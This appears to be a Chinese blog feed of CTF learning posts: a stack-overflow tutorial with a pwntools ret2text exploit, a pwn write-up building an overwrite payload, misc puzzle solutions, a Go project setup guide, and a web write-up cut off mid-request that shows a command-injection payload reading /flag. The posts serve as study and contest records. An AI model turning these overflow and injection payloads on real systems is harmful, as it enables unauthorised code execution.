        <content type="html"><![CDATA[<h1 id="Pwn基础——栈基础"><a href="#Pwn基础——栈基础" class="headerlink" title="Pwn基础——栈基础"></a>Pwn基础——栈基础</h1><h2 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h2><p>本文参考：<a href="https://paper.seebug.org/271/" target="_blank" rel="noopener">https://paper.seebug.org/271/</a>  手把手教你栈溢出从入门到放弃（上）</p><p>本文只在原作者的基础上增加了一些ctf-wiki上的一些例子</p><p>本文只做学习记录使用、不做他用</p><p>这几天开始整理栈溢出、后面整理堆溢出</p><h2 id="0x10-函数调用栈"><a href="#0x10-函数调用栈" class="headerlink" title="0x10 函数调用栈"></a>0x10 函数调用栈</h2><p>函数调用栈是指程序运行时内存一段连续的区域，用来保存函数运行时的状态信息，包括函数参数与局部变量等。称之为“栈”是因为发生函数调用时，调用函数（caller）的状态被保存在栈内，被调用函数（callee）的状态被压入调用栈的栈顶；在函数调用结束时，栈顶的函数（callee）状态被弹出，栈顶恢复到调用函数（caller）的状态。函数调用栈在内存中从高地址向低地址生长，所以栈顶对应的内存地址在压栈时变小，退栈时变大。</p><p><img src="https://cdn.jsdelivr.net/gh/180CM55KG/cdn/img/20200208220131.png" alt=""></p><p>函数调用发生和结束时调用栈的变化：</p><p>函数状态主要涉及三个寄存器－－esp，ebp，eip。esp 用来存储函数调用栈的栈顶地址，在压栈和退栈时发生变化。ebp 用来存储当前函数状态的基地址，在函数运行时不变，可以用来索引确定函数参数或局部变量的位置。eip 用来存储即将执行的程序指令的地址，cpu 依照 eip 的存储内容读取指令并执行，eip 随之指向相邻的下一条指令，如此反复，程序就得以连续执行指令。</p><p>下面让我们来看看发生函数调用时，栈顶函数状态以及上述寄存器的变化。变化的核心任务是将调用函数（caller）的状态保存起来，同时创建被调用函数（callee）的状态。</p><p>首先将被调用函数（callee）的参数按照逆序依次压入栈内。如果被调用函数（callee）不需要参数，则没有这一步骤。这些参数仍会保存在调用函数（caller）的函数状态内，之后压入栈内的数据都会作为被调用函数（callee）的函数状态来保存。</p><p><img src="https://cdn.jsdelivr.net/gh/180CM55KG/cdn/img/20200208220129.png" alt=""></p><p>将被调用函数的参数压入栈内</p><p>然后将调用函数（caller）进行调用之后的下一条指令地址作为返回地址压入栈内。这样调用函数（caller）的 eip（指令）信息得以保存。</p><p><img src="https://cdn.jsdelivr.net/gh/180CM55KG/cdn/img/20200208220139.png" alt=""></p><p>将被调用函数的返回地址压入栈内</p><p>再将当前的ebp 寄存器的值（也就是调用函数的基地址）压入栈内，并将 ebp 寄存器的值更新为当前栈顶的地址。这样调用函数（caller）的 ebp（基地址）信息得以保存。同时，ebp 被更新为被调用函数（callee）的基地址。</p><p><img src="https://cdn.jsdelivr.net/gh/180CM55KG/cdn/img/20200208220135.png" alt=""></p><p>将调用函数的基地址（ebp）压入栈内，并将当前栈顶地址传到 ebp 寄存器内</p><p>再之后是将被调用函数（callee）的局部变量等数据压入栈内。</p><p><img src="https://cdn.jsdelivr.net/gh/180CM55KG/cdn/img/20200208220144.png" alt=""></p><p>将被调用函数的局部变量压入栈内</p><p>在压栈的过程中，esp 寄存器的值不断减小（对应于栈从内存高地址向低地址生长）。压入栈内的数据包括调用参数、返回地址、调用函数的基地址，以及局部变量，其中调用参数以外的数据共同构成了被调用函数（callee）的状态。在发生调用时，程序还会将被调用函数（callee）的指令地址存到 eip 寄存器内，这样程序就可以依次执行被调用函数的指令了。</p><p>看过了函数调用发生时的情况，就不难理解函数调用结束时的变化。变化的核心任务是丢弃被调用函数（callee）的状态，并将栈顶恢复为调用函数（caller）的状态。</p><p>首先被调用函数的局部变量会从栈内直接弹出，栈顶会指向被调用函数（callee）的基地址。</p><p><img src="https://cdn.jsdelivr.net/gh/180CM55KG/cdn/img/20200208220136.png" alt=""></p><p>将被调用函数的局部变量弹出栈外</p><p>然后将基地址内存储的调用函数（caller）的基地址从栈内弹出，并存到 ebp 寄存器内。这样调用函数（caller）的 ebp（基地址）信息得以恢复。此时栈顶会指向返回地址。</p><p><img src="https://cdn.jsdelivr.net/gh/180CM55KG/cdn/img/20200208220138.png" alt=""></p><p>将调用函数（caller）的基地址（ebp）弹出栈外，并存到 ebp 寄存器内</p><p>再将返回地址从栈内弹出，并存到 eip 寄存器内。这样调用函数（caller）的 eip（指令）信息得以恢复。</p><p><img src="https://cdn.jsdelivr.net/gh/180CM55KG/cdn/img/20200208220130.png" alt=""></p><p>将被调用函数的返回地址弹出栈外，并存到 eip 寄存器内</p><p>至此调用函数（caller）的函数状态就全部恢复了，之后就是继续执行调用函数的指令了。</p><h2 id="0x20-技术清单"><a href="#0x20-技术清单" class="headerlink" title="0x20 技术清单"></a>0x20 技术清单</h2><p>当函数正在执行内部指令的过程中我们无法拿到程序的控制权，只有在发生函数调用或者结束函数调用时，程序的控制权会在函数状态之间发生跳转，这时才可以通过修改函数状态来实现攻击。而控制程序执行指令最关键的寄存器就是 eip（还记得 eip 的用途吗？），所以我们的目标就是让 eip 载入攻击指令的地址。</p><p>先来看看函数调用结束时，如果要让 eip 指向攻击指令，需要哪些准备？首先，在退栈过程中，返回地址会被传给 eip，所以我们只需要让溢出数据用攻击指令的地址来覆盖返回地址就可以了。其次，我们可以在溢出数据内包含一段攻击指令，也可以在内存其他位置寻找可用的攻击指令。</p><p><img src="https://cdn.jsdelivr.net/gh/180CM55KG/cdn/img/20200208220142.png" alt=""></p><p>核心目的是用攻击指令的地址来覆盖返回地址</p><p>再来看看函数调用发生时，如果要让 eip 指向攻击指令，需要哪些准备？这时，eip 会指向原程序中某个指定的函数，我们没法通过改写返回地址来控制了，不过我们可以“偷梁换柱”－－将原本指定的函数在调用时替换为其他函数。</p><p>所以这篇文章会覆盖到的技术大概可以总结为（括号内英文是所用技术的简称）：</p><ul><li>修改返回地址，让其指向溢出数据中的一段指令（<strong>shellcode</strong>）</li><li>修改返回地址，让其指向内存中已有的某个函数（<strong>return2libc</strong>）</li><li>修改返回地址，让其指向内存中已有的一段指令（<strong>ROP</strong>）</li><li>修改某个被调用函数的地址，让其指向另一个函数（<strong>hijack GOT</strong>）</li></ul><h2 id="0x30-example"><a href="#0x30-example" class="headerlink" title="0x30 example"></a>0x30 example</h2><p>下面我们通过一道非常简单的题来理解栈溢出</p><p>此例子来源于\CTF-wiki\ctf-challenges\pwn\stackoverflow\ret2text\bamboofox-ret2text</p><p>在 ctf-wiki\ctf-challenges（<a href="https://github.com/CTF-wiki/ctf-challenges.git）上可以下载到" target="_blank" rel="noopener">https://github.com/CTF-wiki/ctf-challenges.git）上可以下载到</a></p><p>源代码</p><pre class=" language-lang-c"><code class="language-lang-c">#include <stdio.h>#include <stdlib.h>#include <time.h>void secure(void){    int secretcode, input;    srand(time(NULL));    secretcode = rand();    scanf("%d", &input);    if(input == secretcode)        system("/bin/sh");}int main(void){    setvbuf(stdout, 0LL, 2, 0LL);    setvbuf(stdin, 0LL, 1, 0LL);    char buf[100];    printf("There is something amazing here, do you know anything?\n");    gets(buf);    printf("Maybe I will tell you next time !");    return 0;}</code></pre><p>编译命令：</p><pre class=" language-lang-txt"><code class="language-lang-txt">gcc -m32 -fno-stack-protector\\关闭栈保护</code></pre><p>通过gets()函数我们可以读取任意长度的字符串进入栈中</p><p>于是我们就可以通过gets()一定长度的数据来填充EBP，从上面函数调用栈的过程中我们可以了解到：EBP后面就是函数的返回地址，当我们填充完EBP后如果我们在输入就会覆盖掉函数的返回地址，函数会将我们输入的东西（比如：0x12345678）作为返回地址，在退栈的过程中我们输入的返回地址会被传给EIP，此时EIP就会指向(0x12345678)就完成了我们的目的</p><p>而相对于本题：</p><p>如果我们将返回地址修改为：0x0804863A</p><p>程序就会执行：</p><pre class=" language-lang-txt"><code class="language-lang-txt">mov     dword ptr [esp], offset command ; "/bin/sh"call    _system</code></pre><p>从而返回给我们shell</p><p>exp:</p><pre class=" language-lang-python"><code class="language-lang-python">#!/usr/bin/env pythonfrom pwn import *sh = process('./ret2text')target = 0x804863ash.sendline('A' * (0x6c + 4) + p32(target))sh.interactive()</code></pre><h2 id="0x100-知识详细介绍"><a href="#0x100-知识详细介绍" class="headerlink" title="0x100 知识详细介绍"></a>0x100 知识详细介绍</h2><pre class=" language-lang-txt"><code class="language-lang-txt">eax, ebx, ecx, edx, esi, edi, ebp, esp等都是X86 汇编语言中CPU上的通用寄存器的名称，是32位的寄存器。EAX 是"累加器"(accumulator), 它是很多加法乘法指令的缺省寄存器。EBX 是"基地址"(base)寄存器, 在内存寻址时存放基地址。ECX 是计数器(counter), 是重复(REP)前缀指令和LOOP指令的内定计数器。EDX 则总是被用来放整数除法产生的余数。ESI/EDI分别叫做"源/目标索引寄存器"(source/destination index),因为在很多字符串操作指令中, DS:ESI指向源串,而ES:EDI指向目标串.EBP是"基址指针"(BASE POINTER), 它最经常被用作高级语言函数调用的"框架指针"(frame pointer). 在破解的时候,经常可以看见一个标准的函数起始代码:push ebp ;保存当前ebpmov ebp,esp ;EBP设为当前堆栈指针sub esp, xxx ;预留xxx字节给函数临时变量....这样一来,EBP 构成了该函数的一个框架, 在EBP上方分别是原来的EBP, 返回地址和参数. EBP下方则是临时变量. 函数返回时作 mov esp,ebp/pop ebp/ret 即可.ESP 专门用作堆栈指针，被形象地称为栈顶指针，堆栈的顶部是地址小的区域，压入堆栈的数据越多，ESP也就越来越小。在32位平台上，ESP每次减少4字节。1. esp 用来存储函数调用栈的栈顶地址，在压栈和退栈时发生变化。2. ebp 用来存储当前函数状态的基地址，在函数运行时不变，可以用来索引确定函数参数或局部变量的位置。3. eip 用来存储即将执行的程序指令的地址，cpu 依照 eip 的存储内容读取指令并执行，eip 随之指向相邻的下一条指令，如此反复，程序就得以连续执行指令。</code></pre><script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> ctf </tag>
            
            <tag> pwn </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>pwn-checkin</title>
      <link href="/2020/01/24/ctf/pwn/pwn-checkin/"/>
      <url>/2020/01/24/ctf/pwn/pwn-checkin/</url>
      
        <content type="html"><![CDATA[<h1 id="Checkin解题思路一"><a href="#Checkin解题思路一" class="headerlink" title="Checkin解题思路一"></a>Checkin解题思路一</h1><h2 id="文件属性"><a href="#文件属性" class="headerlink" title="文件属性"></a>文件属性</h2><p>file查看发现文件是32位的</p><h2 id="Checksec"><a href="#Checksec" class="headerlink" title="Checksec"></a>Checksec</h2><p>checksec发现程序开启了NX保护</p><h2 id="反编译"><a href="#反编译" class="headerlink" title="反编译"></a>反编译</h2><p>IDA反编译查看源代码</p><pre class=" language-lang-c"><code class="language-lang-c">checker函数int __cdecl checker(int a1){  int result; // eax@2  char buf; // [sp+Eh] [bp-3Ah]@1  char name[4]; // [sp+2Ch] [bp-1Ch]@1  int v4; // [sp+30h] [bp-18h]@1  char *s; // [sp+34h] [bp-14h]@2  int (__cdecl *v6)(int); // [sp+38h] [bp-10h]@1  int v7; // [sp+3Ch] [bp-Ch]@1  v7 = 8;  *name = 1819042157;  v4 = 25455;  printf("your input : ");  read(0, &buf, 0x4Au);  strncpy(st, &buf, 8u);  v6 = load(name);  if ( a1 == -559038737 )  {    s = v6(v7);    __isoc99_scanf("%s", s);    result = puts(s);  }  else  {    result = puts("Think about it ");  }  return result;}</code></pre><pre class=" language-lang-c"><code class="language-lang-c">load()函数void *__cdecl load(char *name){  char *v1; // eax@2  void *handle; // [sp+8h] [bp-10h]@1  void *v4; // [sp+Ch] [bp-Ch]@4  handle = dlopen("/lib32/libc.so.6", 258);  if ( !handle )  {    v1 = dlerror();    printf("dlopen - %s\n", v1);    exit(0);  }  v4 = dlsym(handle, name);  if ( !v4 )  {    puts("Can't load function");    exit(0);  }  return v4;}</code></pre><h2 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h2><p>发现load函数提供了根据传入的参数 字符串name 进而找到的libc库中的函数地址 然后返回给了v4，我们来分析下 怎么 pwn 掉这个程序? 执行 system(‘/bin/sh’) 。</p><ol><li>main()函数中read存在溢出，但是字节为0x4a-0x3a, 太少，因此我们去分析load函数</li><li>通过buf将name覆盖为system 0x3a-0x1c=30=0x1e</li><li>system 是 libc 中 的函数，我们 将局部变量name 覆盖为 system</li><li>我们将 v7 覆盖为 /bin/sh 所在的地址，即 st 地址</li><li>全局变量st = payload 前 8个字符，paylaod前八个字符为 /bin/sh\x00</li><li>当参数 a1为 0xDEADBEEF 时 才会 执行 v5(v6) ，所以我们还要将 参数 a1 覆盖为 0xDEADBEEF！</li></ol><h2 id="Payload"><a href="#Payload" class="headerlink" title="Payload"></a>Payload</h2><p>因此payload:</p><pre class=" language-lang-txt"><code class="language-lang-txt">payload="/bin/sh\x00".ljust(0x1e,"\x00")+"system\x00" #0x3a-0x1c=0x1e + system= 将name覆盖为systempayload=payload.ljust(0x2e,"\x00")+p32(st_addr) #因为程序是32 位程序 0x1e+0x10(v6)payload=payload.ljust(0x3e,"\x00") #ebp buf为0x3a 0x3a+0x4填充EBPpayload+=p32(0) #返回地址paylaod+=p32(0xdeadbeef) #参数 1</code></pre><p>pwn32位payload构造:</p><pre class=" language-lang-txt"><code class="language-lang-txt">方法一：payload = 'a' * offset + 4 * 'a' + p32(sys_addr) + p32(4) + p32(sh_addr)方法二：payload = 'a' * offset + 4 * 'a' + p32(read_addr) + p32(elf.bss()) + p32(0) + p32(elf.bss()) + p32(len(shellcode))</code></pre><script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> ctf </tag>
            
            <tag> pwn </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>西南石油大学CTF做题记录</title>
      <link href="/2019/12/07/ctf/misc/swpuctf/"/>
      <url>/2019/12/07/ctf/misc/swpuctf/</url>
      
        <content type="html"><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>​    起床打CTF了,登陆平台，一看题目简单的python,easy_web，一看一道不会，，，，tcl除了misc,啥都不会</p><p>​    人傻了，先做两道 misc 吧</p><h1 id="Misc部分"><a href="#Misc部分" class="headerlink" title="Misc部分"></a>Misc部分</h1><p>这次misc一共先发出来了五道题，我做出来四道，那一道影流之主…tql</p><h2 id="神奇的二维码"><a href="#神奇的二维码" class="headerlink" title="神奇的二维码"></a>神奇的二维码</h2><p>题目描述：啥也不说了，扫码支付获取flag^_^ || hint1：flag全是小写</p><p>图种套娃题，mp3隐写</p><p>给了张图</p><p><img src="https://cdn.jsdelivr.net/gh/180CM55KG/cdn/img/20191206222617.png" alt="题目"></p><p>不用扫了，swpuctf{flag_is_not_here}</p><p>binwalk直接提取，提取出一大堆东西</p><p><img src="https://cdn.jsdelivr.net/gh/180CM55KG/cdn/img/20191206223558.png" alt="提取后"></p><p>（good.mp3、flag.doc等好几个不是啊，#我忘了）</p><p>思就是套娃题的思路</p><p>拿encode.txt里的东西取解flag在不在里面</p><p>解出来以后取出里面的flag.doc,flag.jpg</p><p>写脚本解flag.doc里面的base64</p><pre class=" language-lang-python"><code class="language-lang-python">import base64fp=open("flag.txt",'r')for line in fp:    flag=base64.b64decode(line)    while base64.b64decode(flag):        if 'flag' in flag:            print(flag)            break        else:            flag = base64.b64decode(flag)</code></pre><p>解出来后拿去解</p><pre class=" language-lang-shell"><code class="language-lang-shell">binwalk flag.jpg -e</code></pre><p>出来的压缩包</p><p>然后解出来good.mp3,放入Audacity中</p><p>看出来是摩斯密码</p><p>解出来flag</p><pre class=" language-lang-txt"><code class="language-lang-txt">morseisveryveryveryeasy</code></pre><p>套上格式提交</p><h2 id="漂流的马里奥"><a href="#漂流的马里奥" class="headerlink" title="漂流的马里奥"></a>漂流的马里奥</h2><p>题目描述：链接：<a href="https://pan.baidu.com/s/1Bj2LJMNwSch-cKMK56K9hg" target="_blank" rel="noopener">https://pan.baidu.com/s/1Bj2LJMNwSch-cKMK56K9hg</a> 提取码：d3fp</p><p>取证分析题</p><p>运行题目给的.exe文件后，电脑桌面上多出来一个内容是ntfs,flag.txt的文件</p><p>ntfs是什么，百度就行了</p><p>然后找ntfs隐藏流查找工具</p><p>Ntfs Streams Editor</p><p>然后让他扫一遍就行了，这里不写了，我放到虚拟机里扫的</p><pre class=" language-lang-txt"><code class="language-lang-txt">swupctf{ddg_is_cute}</code></pre><h2 id="伟大的侦探"><a href="#伟大的侦探" class="headerlink" title="伟大的侦探"></a>伟大的侦探</h2><p>题目描述：链接：<a href="https://pan.baidu.com/s/1JaMbDl0efPPsGKxA7x3ULw" target="_blank" rel="noopener">https://pan.baidu.com/s/1JaMbDl0efPPsGKxA7x3ULw</a> 提取码：9zcf || hint1：压缩包密码解码之后最后一位是! || hint2：flag没有空格，格式为swpuctf{}</p><p>脑洞题</p><p>先是给了一个压缩包，里面有一个密码.txt</p><p><img src="https://cdn.jsdelivr.net/gh/180CM55KG/cdn/img/20191206230004.png" alt="密码.txt"></p><p>有一说一我找了一下午也没找到这是什么编码</p><p>但终于我在一个misc大佬的博客里找到了这个编码怎么解 附大佬博客：</p><p><a href="https://blog.xiafeng2333.top/author/xiafeng2333/" target="_blank" rel="noopener">https://blog.xiafeng2333.top/author/xiafeng2333/</a></p><p><img src="https://cdn.jsdelivr.net/gh/180CM55KG/cdn/img/20191206230853.png" alt=""></p><p>解压发现一堆</p><p>火柴人？？？？</p><p><img src="https://cdn.jsdelivr.net/gh/180CM55KG/cdn/img/20191206231053.png" alt=""></p><p>在看了大半天火柴人跳舞以及百度后</p><p>运气爆棚，我搜了以下密码吧，结果发现了这个</p><p>福尔摩斯小人跳舞，原来题目是这个意思啊</p><p><img src="https://cdn.jsdelivr.net/gh/180CM55KG/cdn/img/20191206231552.jpg" alt=""></p><p>照着上面解密</p><pre class=" language-lang-txt"><code class="language-lang-txt">swpuctf{iloveholmesandwllm}</code></pre><h2 id="Network"><a href="#Network" class="headerlink" title="Network"></a>Network</h2><p>题目描述</p><p>链接：<a href="https://pan.baidu.com/s/1MKlcjLakWYDjk1B8G1OquQ" target="_blank" rel="noopener">https://pan.baidu.com/s/1MKlcjLakWYDjk1B8G1OquQ</a> 提取码：gx4l || 描述：flag格式为flag{} || hint：ttl || hint2：伪加密</p><p>ttl隐写</p><p>题目说的很清楚了</p><p>打开压缩包发现里面只有一个t.txt</p><p>t.txt里面是63 127 191 255这几个字符</p><p>根据题目的提示</p><pre class=" language-lang-txt"><code class="language-lang-txt">63    00111111 127   01111111 191   10111111 255   11111111</code></pre><p>每个取前两位组成新的八位二进制</p><p>发现前八位的二进制为</p><pre class=" language-lang-txt"><code class="language-lang-txt">00110101 00110000 00110100 01100010</code></pre><p>转换成ascii</p><pre class=" language-lang-txt"><code class="language-lang-txt">504b</code></pre><p>压缩包的开头</p><p>贴上解密脚本</p><pre class=" language-lang-python"><code class="language-lang-python">fp = open('t.txt','r')a=fp.readlines()p=[]for i in a:    p.append(int(i))s=''for i in p:    if i==63:        a='00'    elif i==127:        a='01'    elif i==191:        a='10'    elif i==255:        a='11'    s += a#print(s)import binasciiflag=''for i in range(0,len(s),8):    flag += chr(int(s[i:i+8],2))flag=binascii.unhexlify(flag)wp=open('res.zip','wb')wp.write(flag)wp.close()</code></pre><p>解出的压缩包里面有base64加密</p><p>上解密脚本：</p><pre class=" language-lang-python"><code class="language-lang-python">import base64fp=open("flag.txt",'r')for line in fp:    flag=base64.b64decode(line)    while base64.b64decode(flag):        if 'flag' in flag:            print(flag)            break        else:            flag = base64.b64decode(flag)</code></pre><p>解出flag</p><pre class=" language-lang-txt"><code class="language-lang-txt">flag{189ff9e5b743ae95f940a6ccc6dbd9ab}</code></pre><h2 id="你好好看网课了吗"><a href="#你好好看网课了吗" class="headerlink" title="你好好看网课了吗"></a>你好好看网课了吗</h2><p>网课12.6截至，我看了/xyx，有没有好好看就不一定了</p><p>题目描述<a href="https://pan.baidu.com/s/10aXg8SrgyhQqeceBbD3tZg" target="_blank" rel="noopener">https://pan.baidu.com/s/10aXg8SrgyhQqeceBbD3tZg</a> 提取码：078j || hint1：word文档很重要 || hint2：工具也许是某种视频剪辑工具 || hint3：word文档中的数字很重要 || 压缩包密码都是小写</p><p>不会写，没工具</p><p>个人感觉应该是MP4提取出来音频后，用MP3stego结合word文档中的东西解出来压缩包，然后暴力破解？</p><h1 id="Web部分"><a href="#Web部分" class="headerlink" title="Web部分"></a>Web部分</h1><p>web也就签到题我能做一下</p><h2 id="easy-web"><a href="#easy-web" class="headerlink" title="easy_web"></a>easy_web</h2><p>hint1：不是xss || hint2：使用somd5解flag</p><p>题目说了不是xss,随便注册登陆进去后，发现可以发文章</p><p>在标题处下单引号后，保存返回查看文章，发现SQL语句报错</p><p>结合报错应该就是Limit Sql注入</p><script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> swpuctf </tag>
            
            <tag> ctf </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Go-web github 开源项目 puti 学习</title>
      <link href="/2019/12/04/go-web/puti/"/>
      <url>/2019/12/04/go-web/puti/</url>
      
        <content type="html"><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>​    学习 GO 已经将近一年的时间，在学校因为杂七杂八的事情学习进度一直很慢，可能还是因为自己的颓废，以及对时间的安排不是很合理吧。</p><p>​    指导老师说项目驱动学习，会提高我的学习效率，而工作室这边也都是商业项目，不能用来学习。听了指导老师的意见以后，在网上找了大半天，主要是Go的web项目实在是少的可怜，终于让我找到了一个前后端分离的项目 <a href="https://github.com/puti-projects/puti" target="_blank" rel="noopener">puti</a></p><p>​    这是一个博客系统，其实我一直也想做一个博客系统来练练手，，，</p><h1 id="项目运行"><a href="#项目运行" class="headerlink" title="项目运行"></a>项目运行</h1><p>​    由于这是我第一次在github上找开源项目来学习，在学习的第一步就遇到了很多问题，，，</p><p>​    在这里，我把我遇到的问题记录一下，积累经验，同时也能方便后边遇到同样问题的人使用</p><h1 id="下载安装"><a href="#下载安装" class="headerlink" title="下载安装"></a>下载安装</h1><p>​    由于对docker的使用不够熟练，这次我选择的是源码安装，有时间学习一下docker</p><h2 id="源码安装"><a href="#源码安装" class="headerlink" title="源码安装"></a>源码安装</h2><h3 id="Go语言下载与环境变量配置"><a href="#Go语言下载与环境变量配置" class="headerlink" title="Go语言下载与环境变量配置"></a>Go语言下载与环境变量配置</h3><p>关于Go语言在linux Ubantu中的下载配置有很多教程，但当我使用那些教程的时候还是遇到了很多问题，因此在这里我自己在写一遍教程</p><p>首先是Go语言的下载，<a href="https://golang.google.cn/" target="_blank" rel="noopener">Go</a></p><p>选择适合你系统的Go语言下载，本次项目要求Go语言的版本在<strong>1.11</strong>以上（以下的还真用不了），1.11以上有Go module</p><p><img src="https://cdn.jsdelivr.net/gh/180CM55KG/cdn/img/20191203175333.png" alt="Golang官网"></p><p>下载过后，我们把它解压到 /usr/local/ 目录下</p><pre class=" language-lang-shell"><code class="language-lang-shell">tar -C /usr/local -xzf go1.13.4.linux-amd64.tar.gz</code></pre><p>接下来就是配置环境变量, 在/etc/profile （即全局环境变量下修改）最后添加</p><pre class=" language-lang-shell"><code class="language-lang-shell">vim /etc/profile</code></pre><pre class=" language-lang-shell"><code class="language-lang-shell">export GOROOT=/usr/local/goexport GOPATH=$HOME/go #这里是你go的workspaceexport PATH=$PATH:$GOROOT/bin</code></pre><p><img src="https://cdn.jsdelivr.net/gh/180CM55KG/cdn/img/20191203181150.png" alt="屏幕截图"></p><pre class=" language-lang-shell"><code class="language-lang-shell">source /etc/profile</code></pre><p>立刻生效</p><p>这里可能会出现一个问题，就是关闭终端后，环境变量就失效了，在网上查了半天后，我的解决方法是这样的</p><pre class=" language-lang-shell"><code class="language-lang-shell">vim ~/.bashrc</code></pre><p>在里面添加</p><pre class=" language-lang-shell"><code class="language-lang-shell">export GOPATH=$HOME/goexport GOROOT=/usr/local/goexport GOARCH=386export GOOS=linuxexport GOTOOLS=$GOROOT/pkg/toolexport PATH=$PATH:$GOROOT/bin:$GOPATH/bin</code></pre><p><img src="https://cdn.jsdelivr.net/gh/180CM55KG/cdn/img/20191203182609.png" alt="屏幕截图"></p><pre class=" language-lang-shell"><code class="language-lang-shell">go version //检测安装是否成功</code></pre><p>到此安装Go就算完成了</p><h3 id="Git下载"><a href="#Git下载" class="headerlink" title="Git下载"></a>Git下载</h3><p>最简单的下载方式</p><pre class=" language-lang-shell"><code class="language-lang-shell">apt-get install git</code></pre><p>这种安装方式不是很好</p><p>其他安装方法也百度得到，这里就不写了</p><h3 id="源码下载"><a href="#源码下载" class="headerlink" title="源码下载"></a>源码下载</h3><pre class=" language-lang-txt"><code class="language-lang-txt"># 下载$ go get -u github.com/puti-projects/puti# 使用Makefile来构建程序$ cd $GOPATH/src/github.com/puti-projects/puti$ make</code></pre><p>本次安装是在我的Ubantu16.04的虚拟机上，windows下出了很多问题，浪费了我很多时间。</p><h3 id="MySQL下载"><a href="#MySQL下载" class="headerlink" title="MySQL下载"></a>MySQL下载</h3><p>这个项目需要mysql数据库来运行</p><p>MySQL的安装教程 <a href="https://blog.csdn.net/james_nan/article/details/82053430" target="_blank" rel="noopener">https://blog.csdn.net/james_nan/article/details/82053430</a></p><p>接下来就是把puti下面的sql文件导入到数据库中</p><p>先建好数据库</p><pre class=" language-lang-shell"><code class="language-lang-shell">$ mysql -uroot -p$ create database db_puti</code></pre><p>导入sql文件</p><pre class=" language-lang-shell"><code class="language-lang-shell">$ cd $GOPATH/src/github.com/puti-projects/puti/init/scheam/</code></pre><pre class=" language-lang-shell"><code class="language-lang-shell">$ mysql -uroot -p -B db_puti < db_puti.sql</code></pre><h2 id="修改配置文件"><a href="#修改配置文件" class="headerlink" title="修改配置文件"></a>修改配置文件</h2><p>配置文件位于config目录</p><p>我们新建一个config.yaml文件，在里面写入</p><pre class=" language-lang-txt"><code class="language-lang-txt">runmode: release                 # 开发模式, debug, release, testaddr: 8000                  # HTTP绑定端口name: puti              # API Server的名字ping_url: http://127.0.0.1:8000   # pingServer函数请求的API服务器的ip:portping_max_num: 10           # pingServer函数try的次数jwt_secret: putidemojwtseCrect013keyideOgormlog: false# tlstls:  https_open: false  addr: 8080  cert: configs/server.crt  key: configs/server.key# loggerlog:  logger_file: logs/server.log  logger_max_size: 1024   logger_max_backups: 7  logger_max_age: 31 # databasedb:  name: db_puti  addr: 127.0.0.1:3306  username: root  password: root</code></pre><h2 id="启动项目"><a href="#启动项目" class="headerlink" title="启动项目"></a>启动项目</h2><pre class=" language-lang-shell"><code class="language-lang-shell">$ go run main.go</code></pre><p><img src="https://cdn.jsdelivr.net/gh/180CM55KG/cdn/img/20191203184956.png" alt="屏幕截图"></p><p><img src="https://cdn.jsdelivr.net/gh/180CM55KG/cdn/img/20191203184948.png" alt="屏幕截图"></p><script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
      
      
      <categories>
          
          <category> Go </category>
          
      </categories>
      
      
        <tags>
            
            <tag> go </tag>
            
            <tag> web </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>安洵杯CTF easywebpayload</title>
      <link href="/2019/11/30/ctf/web/axb/"/>
      <url>/2019/11/30/ctf/web/axb/</url>
      
        <content type="html"><![CDATA[<h1 id="WEB"><a href="#WEB" class="headerlink" title="WEB"></a>WEB</h1><h2 id="easy-web"><a href="#easy-web" class="headerlink" title="easy web"></a>easy web</h2><p>payload:</p><pre class=" language-lang-txt"><code class="language-lang-txt">POST /index.php?img=TmprMlpUWTBOalUzT0RKbE56QTJPRGN3&cmd=ca\t%20/flag HTTP/1.1Host: 47.108.135.45:20270User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:70.0) Gecko/20100101 Firefox/70.0Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2Accept-Encoding: gzip, deflateContent-Type: application/x-www-form-urlencodedContent-Length: 307Origin: http://47.108.135.45:20270Connection: closeReferer: http://47.108.135.45:20270/index.php?img=TmprMlpUWTBOalUzT0RKbE56QTJPRGN3&cmd=1Upgrade-Insecure-Requests: 